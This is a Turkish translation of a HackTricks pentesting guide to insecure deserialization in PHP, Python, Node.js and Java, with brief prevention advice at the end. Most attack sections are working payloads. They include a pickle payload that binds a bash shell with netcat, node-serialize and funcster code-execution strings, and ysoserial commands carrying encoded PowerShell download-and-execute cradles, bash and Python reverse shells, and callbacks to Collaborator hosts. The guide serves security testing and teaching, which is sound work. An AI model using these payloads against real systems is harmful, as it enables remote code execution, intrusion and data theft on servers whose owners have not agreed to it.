# Deserileştirme

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

**Serileştirme**, bir nesneyi korunabilir bir formata dönüştürme yöntemi olarak anlaşılır, nesnenin saklanması veya iletişim sürecinin bir parçası olarak iletilmesi amacıyla. Bu teknik genellikle nesnenin daha sonra yeniden oluşturulabileceğinden emin olmak için kullanılır, yapısını ve durumunu korur.

**Deserileştirme** ise serileştirmeyi karşılayan süreçtir. Belirli bir formatta yapılandırılmış verileri almayı ve bunları bir nesneye yeniden oluşturmayı içerir.

Deserileştirme potansiyel olarak **saldırganların serileştirilmiş verileri manipüle ederek zararlı kodları yürütmesine** veya nesne yeniden oluşturma sürecinde uygulamada beklenmeyen davranışlara neden olmasına olanak tanır.

## PHP

PHP'de serileştirme ve deserileştirme süreçlerinde belirli sihirli yöntemler kullanılır:

* `__sleep`: Bir nesne serileştirilirken çağrılır. Bu yöntem, serileştirilmesi gereken nesnenin tüm özelliklerinin adlarını içeren bir dizi döndürmelidir. Genellikle bekleyen verileri kaydetmek veya benzer temizleme görevlerini gerçekleştirmek için kullanılır.
* `__wakeup`: Bir nesne deserileştirilirken çağrılır. Serileştirme sırasında kaybolmuş olabilecek herhangi bir veritabanı bağlantısını yeniden kurmak ve diğer yeniden başlatma görevlerini gerçekleştirmek için kullanılır.
* `__unserialize`: Bu yöntem, bir nesne deserileştirilirken `__wakeup`'ın yerine (varsa) çağrılır. `__wakeup`'a göre deserileştirme süreci üzerinde daha fazla kontrol sağlar.
* `__destruct`: Bu yöntem, bir nesnenin yok edilmek üzere olduğu veya betiğin sona erdiği zaman çağrılır. Genellikle dosya kollarını kapatma veya veritabanı bağlantıları gibi temizleme görevleri için kullanılır.
* `__toString`: Bu yöntem, bir nesnenin bir dize olarak işlenmesine izin verir. Bir dosyayı okumak veya içindeki işlev çağrılarına dayalı diğer görevleri gerçekleştirmek için kullanılabilir, etkili bir şekilde nesnenin metinsel bir temsilini sağlar.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Eğer sonuçlara bakarsanız, nesne deserialize edildiğinde **`__wakeup`** ve **`__destruct`** fonksiyonlarının çağrıldığını görebilirsiniz. Birçok öğreticide **`__toString`** fonksiyonunun, bazı özellikleri yazdırmaya çalışırken çağrıldığını göreceksiniz, ancak görünüşe göre **artık bu gerçekleşmiyor**.

{% hint style="warning" %}
Eğer sınıfta uygulanmışsa, **`__unserialize(array $data)`** yöntemi **`__wakeup()`** yerine **çağrılır**. Bu yöntem, nesneyi bir dizi olarak serileştirilmiş verileri sağlayarak unserialize etmenizi sağlar. Bu yöntemi kullanarak özellikleri unserialize edebilir ve deserialize işlemi sırasında gerekli olan herhangi bir işlemi gerçekleştirebilirsiniz.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Açıklanan **PHP örneğini buradan** okuyabilirsiniz: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), buradan [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) veya buradan [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Sınıfları

PHP otomatik yükleme işlevselliğini kötüye kullanarak keyfi php dosyalarını ve daha fazlasını yükleyebilirsiniz:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Referans Değerlerin Serileştirilmesi

Bir nedenle bir değeri başka bir değere serileştirilmiş bir **referans olarak** serileştirmek istiyorsanız:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (PHP için ysoserial)

[**PHPGGC**](https://github.com/ambionics/phpggc), PHP serileştirmelerini kötüye kullanmak için payload oluşturmanıza yardımcı olabilir.\
Birçok durumda, uygulamanın kaynak kodunda bir serileştirmeyi kötüye kullanmanın bir yolunu **bulamayabilirsiniz** ancak **harici PHP uzantılarının kodunu kötüye kullanabilirsiniz.**\
Bu nedenle, sunucunun `phpinfo()`'sunu kontrol edin ve **interneti** (hatta **PHPGGC**'nin **gadget'larını**) arayın ve kötüye kullanabileceğiniz olası bir gadget arayın.

### phar:// metadata serileştirmesi

Eğer sadece dosyayı okuyan ve içindeki php kodunu çalıştırmayan bir LFI bulduysanız, örneğin _**file\_get\_contents(), fopen(), file() veya file\_exists(), md5\_file(), filemtime() veya filesize()**_** gibi fonksiyonlar kullanılarak.** Dosya okurken oluşan bir **serileştirme**yi kötüye kullanmaya çalışabilirsiniz **phar** protokolünü kullanarak bir **dosya** okunurken.\
Daha fazla bilgi için aşağıdaki yazıyı okuyun:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Nesne unpickle olduğunda, _\_\_reduce\_\__ fonksiyonu çalıştırılacaktır.\
Kötüye kullanıldığında, sunucu bir hata döndürebilir.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
**Pickle hapishanelerinden kaçmak** hakkında daha fazla bilgi için şu adrese bakın:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Aşağıdaki sayfa, **yamls** python kütüphanelerindeki güvensiz serileştirmeyi kötüye kullanma tekniğini sunar ve **Pickle, PyYAML, jsonpickle ve ruamel.yaml** için RCE serileştirme yükü oluşturmak için kullanılabilecek bir araçla sona erer:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Sınıf Kirliliği (Python Prototip Kirliliği)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Sihirli Fonksiyonlar

JS'de PHP veya Python gibi **"sihirli" fonksiyonlar** bulunmaz, yani bir nesne oluşturulurken yalnızca çalıştırılacak fonksiyonlar yoktur. Ancak **`toString`**, **`valueOf`**, **`toJSON`** gibi **doğrudan çağrılmadan sık ​​kullanılan fonksiyonlar** gibi bazı **fonksiyonlar** vardır.\
Bir serileştirmeyi kötüye kullanarak bu fonksiyonları **başka kodları çalıştırmak için tehlikeye atabilirsiniz** (potansiyel olarak prototip kirliliklerini kötüye kullanabilirsiniz) ve bunlar çağrıldığında keyfi kodları çalıştırabilirsiniz.

Başka bir **"sihirli" bir fonksiyonu doğrudan çağırmadan çağırmanın** yolu, bir **asyon fonksiyonu** (söz veren) tarafından döndürülen bir nesneyi **tehdit eden bir nesneyi tehlikeye atmak**tır. Çünkü, eğer o **dönüş nesnesini** başka bir **fonksiyon türünde "then" adında bir özelliğe sahip bir söz** haline **dönüştürürseniz**, başka bir söz tarafından döndürüldüğü için yalnızca **çalıştırılacaktır**. _Daha fazla bilgi için_ [_**bu bağlantıyı**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _izleyin._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ve `prototype` kirliliği

Bu teknik hakkında bilgi edinmek istiyorsanız **aşağıdaki öğreticiye göz atın**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Bu kütüphane fonksiyonları seri hale getirmeyi sağlar. Örnek:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**Serileştirilmiş nesne**, aşağıdaki gibi görünecektir:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Örnekte görebileceğiniz gibi, bir işlev seri hale getirildiğinde `_$$ND_FUNC$$_` bayrağının seri hale getirilmiş nesneye eklenir.

`node-serialize/lib/serialize.js` dosyasının içinde aynı bayrağı ve kodun nasıl kullandığını bulabilirsiniz.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Son kod parçasında görebileceğiniz gibi, **bayrak bulunursa** `eval` işlevinin işlevi seri hale getirmek için kullanılır, bu nedenle temelde **kullanıcı girdisi `eval` işlevi içinde kullanılır**.

Ancak, bir işlevi **yalnızca seri hale getirmek** onu **çalıştırmaz**, çünkü örneğimizde kodun bir kısmının **`y.rce`'yi çağırması gerekmektedir** ve bu oldukça **olasılıksızdır**.\
Neyse ki, seri hale getirilmiş nesneye **parantez ekleyerek** seri hale getirilen işlevin otomatik olarak çalıştırılmasını sağlamak mümkündür.\
Kodun son parçasında **son parantezi** ve `unserialize` işlevinin kodu otomatik olarak çalıştıracağını fark edin:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Yukarıda belirtildiği gibi, bu kütüphane `_$$ND_FUNC$$_` sonrasındaki kodu alacak ve `eval` kullanarak **çalıştıracak**. Bu nedenle, **kodun otomatik olarak çalıştırılması** için **fonksiyon oluşturma** kısmını ve son parantezi **silebilir** ve aşağıdaki örnekte olduğu gibi **yalnızca bir JS oneliner'ı çalıştırabilirsiniz**:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Bu zafiyetin nasıl sömürüleceği hakkında **daha fazla bilgiyi** [**burada**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) bulabilirsiniz.

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**'ın dikkate değer bir yönü, **standart yerleşik nesnelerin** erişilemez olmasıdır; bunlar erişilebilir kapsamın dışında kalır. Bu kısıtlama, yerleşik nesneler üzerinde yöntemler çağırmaya çalışan kodların yürütülmesini engeller ve `console.log()` veya `require(something)` gibi komutlar kullanıldığında `"ReferenceError: console is not defined"` gibi istisnalara yol açar.

Bu kısıtlamaya rağmen, global bağlamın tam erişiminin, tüm standart yerleşik nesneler dahil, belirli bir yaklaşımla geri kazanılabilir. Global bağlamı doğrudan kullanarak, bu kısıtlamayı atlayabilirsiniz. Örneğin, erişim aşağıdaki kod parçası kullanılarak yeniden sağlanabilir:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Daha fazla bilgi için bu kaynağı okuyun**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** paketi yalnızca serileştirme amaçları için tasarlanmış olup, herhangi bir yerleşik deserializasyon yeteneğine sahip değildir. Kullanıcılar, kendi deserializasyon yöntemlerini uygulamaktan sorumludur. Serileştirilmiş verilerin deserializasyonu için resmi örnekte `eval`'in doğrudan kullanımı önerilmektedir:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Eğer bu fonksiyon nesneleri deserialize etmek için kullanılıyorsa, bunu **kolayca istismar edebilirsiniz**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Daha fazla bilgi için bu kaynağı okuyun**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo kütüphanesi

Bu kütüphaneyi kötüye kullanmak için nasıl bilgi bulabileceğinizi aşağıdaki sayfalarda bulabilirsiniz:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java'da, **serileştirme gerçekleştirme işlemi sırasında serileştirme geri çağrıları yürütülür**. Bu yürütme, kötü niyetli yükler oluşturan saldırganlar tarafından istismar edilebilir ve bu geri çağrıları tetikleyen zararlı eylemlerin potansiyel olarak yürütülmesine yol açabilir.

### Parmak İzi

#### Beyaz Kutu

Kod tabanında potansiyel serileştirme açıklarını tanımlamak için arayın:

* `Serializable` arabirimini uygulayan sınıflar.
* `java.io.ObjectInputStream`, `readObject`, `readUnshare` işlevlerinin kullanımı.

Özellikle dikkat edilmesi gerekenler:

* Harici kullanıcılar tarafından tanımlanan parametrelerle kullanılan `XMLDecoder`.
* Özellikle XStream sürümü 1.46 veya daha düşükse, `XStream`'in `fromXML` yöntemi, çünkü bu sürüm serileştirme sorunlarına duyarlıdır.
* `ObjectInputStream` ile `readObject` yöntemi.
* `readObject`, `readObjectNodData`, `readResolve` veya `readExternal` gibi yöntemlerin uygulanması.
* `ObjectInputStream.readUnshared`.
* `Serializable`'ın genel kullanımı.

#### Siyah Kutu

Siyah kutu testi için, java serileştirilmiş nesneleri belirten belirli **imzalar veya "Sihirli Baytlar"** arayın (`ObjectInputStream` kaynaklı):

* Onaltılık desen: `AC ED 00 05`.
* Base64 deseni: `rO0`.
* `Content-type`'ı `application/x-java-serialized-object` olarak ayarlanmış HTTP yanıt başlıkları.
* Önceki sıkıştırmayı gösteren onaltılık desen: `1F 8B 08 00`.
* Önceki sıkıştırmayı gösteren Base64 deseni: `H4sIA`.
* `.faces` uzantılı web dosyaları ve `faces.ViewState` parametresi. Bu desenleri bir web uygulamasında keşfetmek, [Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) hakkındaki yazıda detaylı bir inceleme yapılmasını gerektirebilir.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Zafiyetli olup olmadığını kontrol et

Eğer **Bir Java Deserialization saldırısının nasıl çalıştığını öğrenmek istiyorsanız** [**Temel Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md) ve [**CommonsCollection1 Yükü**](java-transformers-to-rutime-exec-payload.md) sayfalarına göz atmalısınız.

#### Beyaz Kutu Testi

Bilinen zafiyetlere sahip herhangi bir uygulamanın yüklü olup olmadığını kontrol edebilirsiniz.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
**Sızdırma Testi**

Sunucu tarafında kullanılan herhangi bir savunmasız kütüphanenin kontrol edilmesiyle ilgili değil her zaman. Bazen, **serileştirilmiş nesnenin içindeki verileri değiştirebilir ve bazı kontrolleri atlayabilirsiniz** (belki bir web uygulamasında yönetici ayrıcalıklarını size verebilir).\
Eğer bir web uygulamasına gönderilen bir java serileştirilmiş nesne bulursanız, **gönderilen serileştirilmiş nesneyi daha insan okunabilir bir formatta yazdırmak için** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **kullanabilirsiniz**. Hangi verileri gönderdiğinizi bilmek, bunları değiştirmeyi ve bazı kontrolleri atlamayı daha kolay hale getirecektir.

### **Sızdırma**

#### **ysoserial**

Java serileştirmelerini sömürmek için ana araç [**ysoserial**](https://github.com/frohoff/ysoserial) ([**buradan indirebilirsiniz**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Ayrıca [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) kullanmayı da düşünebilirsiniz, bu size karmaşık komutlar kullanmanıza izin verecektir (örneğin borularla).\
Bu aracın **`ObjectInputStream`**'ı sömürmeye odaklandığını unutmayın.\
Enjeksiyonun mümkün olup olmadığını test etmek için **"URLDNS"** yükünü **RCE** yükünden önce kullanmaya başlardım. Her durumda, "URLDNS" yükünün çalışmadığını ancak diğer RCE yükünün çalıştığını unutmayın.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
**java.lang.Runtime.exec()** için bir yük oluştururken, bir yürütmenin çıktısını yönlendirmek için ">" veya "|" gibi **özel karakterleri kullanamazsınız**, komutları yürütmek için "$()" veya bir komuta **boşluklarla ayrılmış argümanlar** geçmek için (örneğin `echo -n "hello world"` yapabilirsiniz ancak `python2 -c 'print "Hello world"'` yapamazsınız) kullanamazsınız. Yükü doğru şekilde kodlamak için [bu web sitesini](http://www.jackson-t.ca/runtime-exec-payloads.html) kullanabilirsiniz.

Vulnerable web sayfasında test etmek için **Windows ve Linux için tüm olası kod yürütme** yüklerini oluşturmak için aşağıdaki betiği kullanabilirsiniz:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

**serialkillerbypassgadgets** adlı [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) bağlantısını **kullanabilirsiniz** ve daha fazla exploit oluşturmak için ysoserial ile birlikte kullanabilirsiniz. Araç hakkında daha fazla bilgi, aracın sunulduğu **sunum slaytlarında** bulunabilir: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec), Java'da farklı **Json** ve **Yml** serileştirme kütüphanelerini sömürmek için payload oluşturmak için kullanılabilir.\
Projeyi derlemek için `pom.xml` dosyasına bu **bağımlılıkları eklemem gerekiyordu**:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Maven'i yükleyin**, ve projeyi **derleyin**:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Bu Java JSON kütüphanesi hakkında daha fazla bilgi edinin: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labaratuvarlar

* Eğer bazı ysoserial payload'larını test etmek istiyorsanız **bu web uygulamasını çalıştırabilirsiniz**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Neden

Java, çeşitli amaçlar için seri hale getirme işlemini sıkça kullanır:

* **HTTP istekleri**: Serileştirme, parametrelerin, ViewState'in, çerezlerin yönetiminde yaygın olarak kullanılır.
* **RMI (Uzak Yöntem Çağrısı)**: Tamamen seri hale getirmeye dayanan Java RMI protokolü, Java uygulamalarında uzak iletişim için temel bir taşıyıcıdır.
* **HTTP üzerinden RMI**: Bu yöntem, Java tabanlı kalın istemci web uygulamaları tarafından yaygın olarak kullanılır ve tüm nesne iletişimleri için seri hale getirmeyi kullanır.
* **JMX (Java Yönetim Uzantıları)**: JMX, nesnelerin ağ üzerinden iletilmesi için seri hale getirmeyi kullanır.
* **Özel Protokoller**: Java'da, standart uygulama, ilerleyen saldırı örneklerinde gösterileceği gibi ham Java nesnelerinin iletilmesini içerir.

### Önleme

#### Geçici nesneler

`Serializable` arayüzünü uygulayan bir sınıf, sınıf içinde seri hale getirilmemesi gereken herhangi bir nesneyi `transient` olarak işaretleyebilir. Örneğin:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### `Serializable` uygulamak zorunda olan bir sınıfın serileştirilmesinden kaçının

Belirli durumlarda, sınıf hiyerarşisi nedeniyle belirli **nesnelerin `Serializable` arabirimini uygulaması gerektiğinde**, istenmeyen deserializasyon riski vardır. Bunu önlemek için, aşağıda gösterildiği gibi sürekli bir istisna fırlatan `final` `readObject()` yöntemini tanımlayarak bu nesnelerin deserializasyon yapılamaz hale getirildiğinden emin olun:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Java'da Serileştirme Güvenliğini Geliştirme**

**`java.io.ObjectInputStream`'ı Özelleştirme** serileştirme işlemlerini güvence altına almanın pratik bir yoludur. Bu yöntem uygun olduğunda şunlar geçerlidir:

* Serileştirme kodu sizin kontrolünüz altındadır.
* Serileştirme için beklenen sınıflar bilinmektedir.

